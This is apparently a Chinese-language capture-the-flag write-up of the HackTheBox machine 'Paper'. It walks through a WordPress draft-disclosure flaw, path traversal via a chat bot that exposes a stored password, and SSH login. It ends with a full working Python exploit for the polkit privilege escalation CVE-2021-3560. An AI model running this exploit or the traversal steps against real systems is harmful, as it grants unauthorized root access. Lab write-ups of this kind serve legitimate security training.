---
title: Paper
date: 2022-02-25 15:35:53
tags: HackThebox
categories: 路径穿越漏洞
---

## 信息收集
可以看到目标端口只开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/8a3867d4a1e345a5a11c281ff39e1f29.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
当我们访问web服务时，发现只是一个普通的apache搭建的页面。进行目录扫描时，发现一个`manual`页面，但是里面只有一些没价值的信息

<!--more-->

![在这里插入图片描述](https://img-blog.csdnimg.cn/07f9450ea45947e0af77ec195c369cf1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/74d839c7fc824a2a8af4b2c081cd01cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

但是在回应包中，我们看到了一个`office.paper`这样的域名，我们添加到hosts文件后尝试去访问一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/b73a8b76a26d4ae289b29b6085ed2c11.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
打开页面后，我们发现是wordpress搭建的页面。我们果断使用wpscan工具扫描一下是否存在漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/178c760fdb3e46848aa9a75498698290.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现wordpress的版本是`5.2.3`
![在这里插入图片描述](https://img-blog.csdnimg.cn/43583dd7ee5c46fa987f01ac6c04519b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们在EDB上找到一个未经身份验证查看他人私人帖子的漏洞，去尝试一下是否能够成功利用。但是发现只出现404页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/5edd974c3ea34e8c953c7d8c06a35033.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
尝试去掉order参数，成功显示出帖子的详细内容

```xml


test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!

```
从上面的内容中，我们可以得到了一个新的聊天系统网址`http://chat.office.paper/register/8qozr226AhkCHZdyY`。尝试访问发现是一个注册页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/2c563f2f9ee4472180285e1333b6c03e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
注册成功后我们进入了一个聊天窗口，
![在这里插入图片描述](https://img-blog.csdnimg.cn/ae192b2228ce4f5a8fea1614b00fe234.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
在这里有人说到，只要添加了一个`recyclops`这个新的机器人，机器人就会告诉你你想要问题的答案

```xml
 kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
Most frequently asked questions include:
- What time is it?
- What new files are in your sales directory?
- Why did the salesman crossed the road?
- What's the content of file x in your sales directory? etc.
Please note that I am a beta version and I still have some bugs to be fixed.
How to use me ? :
1. Small Talk:
You can ask me how dwight's weekend was, or did he watched the game last night etc.
eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
2. Joke:
You can ask me Why the salesman crossed the road.
eg: 'recyclops why did the salesman crossed the road?'
<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.
3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
4. List:
You can ask me to list the files
5. Time:
You can ask me to what the time is
eg: 'recyclops what time is it?' or just 'recyclops time'
```
## 漏洞利用
目前我们知道的信息是，我们有一个可互动的recyclops机器人，机器人可以帮我们获取文件内容，并且我们不能在频道内发言。我们尝试让它读取test.txt文件时，它说这个文件并不存在，但是却暴露出了当前所在的路径，那么我们可以尝试测试是否存在路径穿越的漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/f56f488f29004c4ba948a413f0c78b38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
经过我们的反复测试，我们发现了确实存在路径穿越漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/5d4e7e5841fc4e34aa1a81f1c83dbf6c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们查看一下当前目录上都存在哪些文件，很可惜没什么有价值的文件信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/29f5abe791764b659abbc217771aa19a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们再查看上一级目录的文件信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/709be64a7a4840d6ac7b8856966c9fe3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现存在一个user.txt文件，尝试读取其内容却告诉我们权限不够
![在这里插入图片描述](https://img-blog.csdnimg.cn/8e0ca8de1430401d98f7d27fccac0641.png)
但是我们发现了一个十分有趣的目录`hubot`，发现目录里存在一个配置文件`.env`，在里面找到一个密码`Queenofblad3s!23`
![在这里插入图片描述](https://img-blog.csdnimg.cn/8811056432c040ffa50cd28396878e3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试使用ssh连接是否能成功，账户使用`dwight`
![在这里插入图片描述](https://img-blog.csdnimg.cn/5edd446e145244249b04910ded3c123c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权ROOT
这里提权挺迷的，但是还是有迹可循。我们查看进程时，发现存在一个`polkit`进程，这个应用是存在漏洞编号的，对应的漏洞编号为`CVE-2021-3560`
![在这里插入图片描述](https://img-blog.csdnimg.cn/957af5667a09416987dac45eaa386a79.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

```python
import os
import sys
import time
import subprocess
import random
import pwd


print ("**************")
print("Exploit: Privilege escalation with polkit - CVE-2021-3560")
print("Exploit code written by Ahmad Almorabea @almorabea")
print("Original exploit author: Kevin Backhouse ")
print("For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/")
print ("**************")
print("[+] Starting the Exploit ")
time.sleep(3)

check = True
counter = 0
while check:
	counter = counter +1
	process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:ahmed','string:"Ahmad Almorabea','int32:1'])
	try:
    		#print('1 - Running in process', process.pid)
		Random = random.uniform(0.006,0.009)
		process.wait(timeout=Random)
		process.kill()
	except subprocess.TimeoutExpired:
    		#print('Timed out - killing', process.pid)
    		process.kill()

	user = subprocess.run(['id', 'ahmed'], stdout=subprocess.PIPE).stdout.decode('utf-8')
	if user.find("uid") != -1:
		print("[+] User Created with the name of ahmed")
		print("[+] Timed out at: "+str(Random))
		check =False
		break
	if counter > 2000:
		print("[-] Couldn't add the user, try again it may work")
		sys.exit(0)


for i in range(200):
	#print(i)
	uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam('ahmed').pw_uid)

	#In case you need to put a password un-comment the code below and put your password after string:yourpassword'
	password = "string:"
	#res = subprocess.run(['openssl', 'passwd','-5',password], stdout=subprocess.PIPE).stdout.decode('utf-8')
	#password = f"string:{res.rstrip()}"

	process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
	try:
    		#print('1 - Running in process', process.pid)
    		Random = random.uniform(0.006,0.009)
    		process.wait(timeout=Random)
    		process.kill()
	except subprocess.TimeoutExpired:
    		#print('Timed out - killing', process.pid)
    		process.kill()

print("[+] Timed out at: " + str(Random))
print("[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root ")

p = subprocess.call("(su ahmed -c 'sudo su')", shell=True)
```
我们将脚本上传到目标主机上运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/81867cb04d4a4523b628cfbe041c54e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
